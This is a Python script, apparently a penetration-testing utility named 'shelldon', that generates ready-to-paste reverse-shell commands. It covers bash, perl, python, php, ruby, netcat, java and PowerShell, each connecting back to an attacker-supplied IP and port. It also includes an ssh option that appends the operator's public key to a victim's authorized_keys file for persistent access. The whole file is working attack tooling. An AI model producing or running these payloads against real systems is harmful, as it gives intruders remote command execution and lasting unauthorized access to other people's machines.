#!/usr/bin/env python3
import argparse, configparser, sys, subprocess, os, pathlib

# This function will return the IPv4 address associated with a given interface
def getIP(interface):
	p1 = subprocess.Popen(["ifconfig"], stdout=subprocess.PIPE)
	p2 = subprocess.Popen(["grep", interface, "-A1"], stdin=p1.stdout, stdout=subprocess.PIPE)
	p3 = subprocess.Popen(["grep", "inet"], stdin=p2.stdout, stdout=subprocess.PIPE)
	ip = subprocess.check_output(["cut", "-d", " ", "-f10"], stdin=p3.stdout).decode('utf-8').strip()
	return ip

# This function will return the command for a bash reverse shell
def bashShell(cmd, host, port):
	output = """%s -i >& /dev/tcp/%s/%s 0>&1"""%(cmd,host,port)
	return output

# This function will return the command for a perl reverse shell
def perlShell(prog, cmd, host, port):
	output = """%s -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("%s -i");};'"""%(prog,host,port,cmd)
	return output

# This function with return the command for a python reverse shell
# The alternate function is to return the command for a pretty shell
def pythonShell(prog, cmd, host, port, alt):
	if (alt):
		output = """export TERM=screen-256color;%s -c 'import pty;pty.spawn("/bin/bash");';"""%(prog)
	else:
		output = """%s -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["%s","-i"]);'"""%(prog,host,port,cmd)
	return output

# This function will return the command for a php reverse shell
def phpShell(prog, cmd, host, port):
	output = """%s -r '$sock=fsockopen("%s",%s);exec("%s -i <&3 >&3 2>&3");'"""%(prog,host,port,cmd)
	return output

# This function will return the command for a ruby reverse shell
def rubyShell(prog, cmd, host, port):
	output = """%s -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("%s -i <&%s >&%s 2>&%s",f,f,f)'"""%(prog,host,port,cmd,"%d","%d","%d")
	return output

# This function will return the command for a netcat-traditional reverse shell
# The alternate function is to return the command for a netcat-openbsd reverse shell
def ncShell(prog, cmd, host, port, alt):
	if (alt):
		output = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|%s %s %s >/tmp/f"""%(cmd,prog,host,port)
	else:
		output = """%s -e %s %s %s"""%(prog,cmd,host,port)
	return output

# This function will return the command for a java reverse shell
def javaShell(cmd, host, port):
	output = """r = Runtime.getRuntime()\np = r.exec(["%s","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()"""%(cmd,host,port)
	return output

# This function will return the command for a powershell reverse shell
# The alternate function returns a different syntax for a powershell reverse shell
def psShell(prog, host, port, alt):
	if (alt):
		output = '''%s -c "$sm=(New-Object Net.Sockets.TCPClient('%s',%s)).GetStream();[byte[]]$bt=0..65535|%s{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"'''%(prog,host,port,'%')
	else:
		output = '''%s -c "$client = New-Object System.Ns.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%s{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'''%(prog,host,port,'%')
	return output

# This function will return the command to append the contents of your id_rsa.pub to a victim's authorized_keys file
def sshKey():
	key = subprocess.check_output(["cat", "%s/.ssh/id_rsa.pub"%(os.environ["HOME"])]).decode('utf-8').strip()
	output = """echo '%s' >> \\"""%(key)
	return output

# This function parses the arguments given and prints (or copies to clipboard) the command for a reverse shell
def getShell(args):
	if (args.windows):
		cmd = config[conf]['WindowsCmd']
	else:
		cmd = config[conf]['LinuxCmd']

	if (args.method == "configure"):
		newconfig = input("Enter new default configuration: ")
		if newconfig != 'INIT' and newconfig in config:
			config['INIT']['Config'] = newconfig
			with open(config_location, 'w') as configfile:
				config.write(configfile)
			print("Default configuration changed to %s (was %s)"%(newconfig,conf))
		else:
			print("Configuration doesn't exist! Check your shelldon.conf file.")
		return

	if (args.method == "bash"):
		output = bashShell(cmd, args.ip, args.port)
	elif (args.method == "perl"):
		if (args.c):
			prog = args.c
		else:
			prog = "perl"
		output = perlShell(prog, cmd, args.ip, args.port)
	elif (args.method == "python"):
		if (args.c):
			prog = args.c
		else:
			prog = "python3"
		output = pythonShell(prog, cmd, args.ip, args.port, args.alternate)
	elif (args.method == "php"):
		if (args.c):
			prog = args.c
		else:
			prog = "php"
		output = phpShell(prog, cmd, args.ip, args.port)
	elif (args.method == "ruby"):
		if (args.c):
			prog = args.c
		else:
			prog = "ruby"
		output = rubyShell(prog, cmd, args.ip, args.port)
	elif (args.method == "nc"):
		if (args.c):
			prog = args.c
		else:
			prog = "nc"
		output = ncShell(prog, cmd, args.ip, args.port, args.alternate)
	elif (args.method == "java"):
		output = javaShell(cmd, args.ip, args.port)
	elif (args.method == "powershell"):
		if (args.c):
			prog = args.c
		else:
			prog = "powershell.exe"
		output = psShell(prog, args.ip, args.port, args.alternate)
	
	elif (args.method == "ssh"):
		output = sshKey()

	if (args.escape):
		if (args.escape == 'both' or args.escape == 'single'):
			output = output.replace("'","\\'");
		if (args.escape == 'both' or args.escape == 'double'):
			output = output.replace('"','\\"');
				
	if (args.clipboard):
		p1 = subprocess.Popen(["echo",output], stdout=subprocess.PIPE)
		subprocess.Popen(["xclip", "-selection", "clipboard"], stdin=p1.stdout)
	else:
		print(output, end='\n')

if __name__ == '__main__':
	config = configparser.ConfigParser()
	config_location = "%s/%s"%(os.path.dirname(os.path.realpath(__file__)),'shelldon.conf')
	config.read(config_location)
	conf = config['INIT']['Config']

	parser = argparse.ArgumentParser(description='Create a customizable reverse shell with little effort!', epilog="Thanks, Shelldon!")

	parser.add_argument('method', metavar='method', help='(configure, bash, perl, python, php, ruby, nc, java, powershell, ssh)',choices=['configure', 'bash','perl','python','php','ruby','nc','java','powershell','ssh'])

	parser.add_argument('-c', metavar='COMMAND', action='store', help='Non-regular name of program (Ex. nc.exe)')
	parser.add_argument('-i', '--ip', action='store', help='Listening ip address')
	parser.add_argument('-p', '--port', action='store', type=int, help='Listening port', default=config[conf]['Port'])
	parser.add_argument('-a', '--alternate', action='store_true', help='Alternate functionality')
	parser.add_argument('-w', '--windows', action='store_true', help='Runs %s instead of %s'%(config[conf]['WindowsCmd'],config[conf]['LinuxCmd']))
	parser.add_argument('-y', '--clipboard', action='store_true', help='Saves command to clipboard instead of printing')
	parser.add_argument('-e', '--escape', help='Escapes single or double quotes. Useful for pasting', choices=['single','double','both'])

	if len(sys.argv) == 1:
		parser.print_help()
		sys.exit(1)

	args = parser.parse_args()

	if (not args.ip):
		args.ip = getIP(config[conf]['Interface'])

	getShell(args)
